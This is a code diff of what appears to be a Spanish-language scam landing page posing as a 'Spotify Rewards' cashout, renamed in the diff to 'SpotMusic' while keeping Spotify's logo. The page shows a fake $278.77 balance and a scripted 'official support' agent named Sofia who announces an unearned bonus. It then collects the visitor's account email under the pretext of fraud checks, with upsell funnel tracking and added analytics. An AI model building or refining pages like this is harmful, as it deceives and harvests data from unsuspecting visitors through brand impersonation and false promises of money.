@@ -5,10 +5,18 @@
   <!-- Redirecionador UTM desativado temporariamente -->
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Spotify Rewards - Cashout</title>
+  <title>SpotMusic Rewards - Cashout</title>
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <!-- Microsoft Clarity -->
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "zjtu42scm0");
+  </script>
   <script src="/sp/meta-pixel.js"></script>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -161,7 +169,7 @@
     <header class="app-header">
       <div class="app-logo">
         <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px;fill:#1DB954"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z" /></svg>
-        Spotify<span style="font-weight: 400; font-size: 11px; color: #606060; border-left: 1px solid rgba(0,0,0,0.2); padding-left: 8px; margin-left: 8px; text-transform: uppercase; letter-spacing: 0.8px;">Rewards</span>
+        SpotMusic<span style="font-weight: 400; font-size: 11px; color: #606060; border-left: 1px solid rgba(0,0,0,0.2); padding-left: 8px; margin-left: 8px; text-transform: uppercase; letter-spacing: 0.8px;">Rewards</span>
       </div>
       <div class="header-right">
         <div class="balance-pill">$<span id="headerBalance">278.77</span></div>
@@ -173,7 +181,7 @@
           <img class="chat-agent-avatar" src="/sp/up1/avatar.jpg" alt="Sofia">
           <div class="chat-agent-info">
             <span class="chat-agent-name">Sofia</span>
-            <span class="chat-agent-status">Soporte Oficial Spotify</span>
+            <span class="chat-agent-status">Soporte Oficial SpotMusic</span>
           </div>
         </div>
         <div class="chat-messages" id="chatStream"></div>
@@ -187,7 +195,7 @@
       var messages = [
         { type: 'text', html: '<svg class="inline-message-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/><path d="M14.8 8.5h-4a2 2 0 0 0 0 4h2.4a2 2 0 1 1 0 4H9M12 6.5v2M12 16.5v2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg><strong>¡Acabas de Ganar un Bono!</strong>', delay: 1800 },
         { type: 'text', html: "¡Felicidades! Se ha desbloqueado un bono especial <strong>exclusivamente para ti</strong>.", delay: 2200 },
-        { type: 'text', html: "Para liberar tu bono y evitar fraudes, Spotify Rewards <strong>requiere confirmación de correo</strong> en cada primer retiro.", delay: 2400 },
+        { type: 'text', html: "Para liberar tu bono y evitar fraudes, SpotMusic Rewards <strong>requiere confirmación de correo</strong> en cada primer retiro.", delay: 2400 },
         { type: 'text', html: "Ingresa el correo vinculado a tu cuenta abajo y confirma. Tu bono será liberado al instante.", delay: 1800 },
         { type: 'btn', delay: 1500 }
       ];
@@ -328,7 +336,7 @@
         card.innerHTML =
           '<div data-funnel-view="upsell_1" style="background:#fff;border:1px solid rgba(29,185,84,0.25);border-radius:16px;padding:14px;box-shadow:0 4px 16px rgba(0,0,0,0.08)">' +
             '<div style="font-size:11px;font-weight:800;letter-spacing:.8px;text-transform:uppercase;color:#1DB954">Verificación de correo requerida</div>' +
-            '<div style="font-size:13px;color:#3c3c43;margin-top:6px;line-height:1.45">Spotify Rewards necesita confirmar tu correo antes de liberar tu bono. Esto protege tu saldo y desbloquea el retiro instantáneo.</div>' +
+            '<div style="font-size:13px;color:#3c3c43;margin-top:6px;line-height:1.45">SpotMusic Rewards necesita confirmar tu correo antes de liberar tu bono. Esto protege tu saldo y desbloquea el retiro instantáneo.</div>' +
             '<input id="spEmail" type="email" inputmode="email" autocomplete="email" placeholder="Ingresa el correo vinculado a tu cuenta" value="' + prefill.replace(/"/g, '&quot;') + '" ' +
               'style="width:100%;margin-top:10px;padding:13px 14px;border:1px solid #d9d9de;border-radius:12px;font-size:15px;font-family:Inter,sans-serif;color:#111;outline:none;background:#fafafa" />' +
             '<div id="spEmailErr" style="display:none;color:#dc2626;font-size:12px;margin-top:6px">Ingresa un correo válido para liberar tu bono.</div>' +
